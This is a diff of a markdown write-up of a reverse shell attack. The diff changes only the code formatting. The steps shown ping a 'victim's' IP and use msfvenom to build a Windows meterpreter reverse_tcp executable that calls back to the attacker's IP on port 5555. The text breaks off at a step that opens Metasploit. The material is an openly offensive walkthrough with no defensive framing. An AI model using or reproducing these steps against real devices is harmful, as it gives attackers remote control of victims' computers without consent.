@@ -9,15 +9,20 @@ Write-up of how to do a reverse shell attack to any type of device, but Apple de
 
 Before starting, we need to get our victim's IP to do this type of attack
 1. **Check if the victim's IP is up.**
-	`ping [IP]`
-
+	```
+	ping [IP]
+ 	```
 
 3. **Create a folder with a basic name and get into that folder.**
-	`mkdir [folder-name] && cd [folder-name]`
+	```
+	mkdir [folder-name] && cd [folder-name]
+	```
 
 
 5. **On the folder created previously execute the command below:**
-	`msfvenom -p windows/meterpreter/reverse_tcp LHOST=[YOUR-IP] LPORT=5555 -f exe > path/to/the/folder/of/step/2/[name].exe`
+	```
+ 	msfvenom -p windows/meterpreter/reverse_tcp LHOST=[YOUR-IP] LPORT=5555 -f exe > path/to/the/folder/of/step/2/[name].exe
+	```
 
 
 7. **Open metasploit and execute this command:** 
